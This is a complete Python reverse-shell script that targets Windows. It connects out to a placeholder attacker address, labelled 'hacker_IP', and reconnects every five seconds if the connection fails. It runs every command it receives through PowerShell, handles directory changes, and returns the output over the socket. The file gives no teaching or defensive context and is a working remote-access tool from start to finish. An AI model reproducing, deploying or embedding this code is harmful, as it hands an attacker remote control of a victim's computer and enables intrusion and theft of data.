import socket
import subprocess
import time
import os

IDENTIFIER = "<END_OF_COMMAND_RESULT>"

if __name__ == "__main__":
    hacker_IP = "X.X.X.X"
    hacker_port = 8008
    hacker_address = (hacker_IP, hacker_port)
    run_program = True  # Control the outer loop
    
    while run_program:
        try:
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("Trying to connect with ", hacker_address)
            victim_socket.connect(hacker_address)
            
            while True:
                try:
                    data = victim_socket.recv(1024)
                    if not data:  # Detect hacker disconnection
                        print("Hacker disconnected")
                        break

                    hacker_command = data.decode()
                    print("Hacker command = ", hacker_command)

                    if hacker_command == "stop":
                        print("Stopping the script as per hacker command.")
                        run_program = False
                        break
                    elif hacker_command == "":
                        continue
                    elif hacker_command.startswith("cd"):
                        path2move = hacker_command.strip("cd ").strip()
                        try:
                            os.chdir(path2move)
                            command_result = f"Changed directory to {os.getcwd()}{IDENTIFIER}"
                        except FileNotFoundError:
                            command_result = f"Directory not found: {path2move}{IDENTIFIER}"
                        except PermissionError:
                            command_result = f"Permission denied: {path2move}{IDENTIFIER}"
                        except Exception as e:
                            command_result = f"Error: {str(e)}{IDENTIFIER}"
                        
                        victim_socket.sendall(command_result.encode("utf-8"))
                        continue

                    else:
                        output = subprocess.run(
                            ["powershell.exe", hacker_command],
                            shell=True,
                            capture_output=True
                        )
                        if output.stderr.decode("utf-8") == "":
                            command_result = output.stdout
                            command_result = command_result.decode("utf-8") + IDENTIFIER
                            command_result = command_result.encode("utf-8")
                        else:
                            command_result = output.stderr

                        victim_socket.sendall(command_result)

                except Exception as inner_err:
                    print("Error during communication: ", inner_err)
                    break
        except KeyboardInterrupt:
            print("Exiting...")
            run_program = False  # Stop the program
        except Exception as err:
            print("Unable to connect: ", err)
            time.sleep(5)
        finally:
            victim_socket.close()
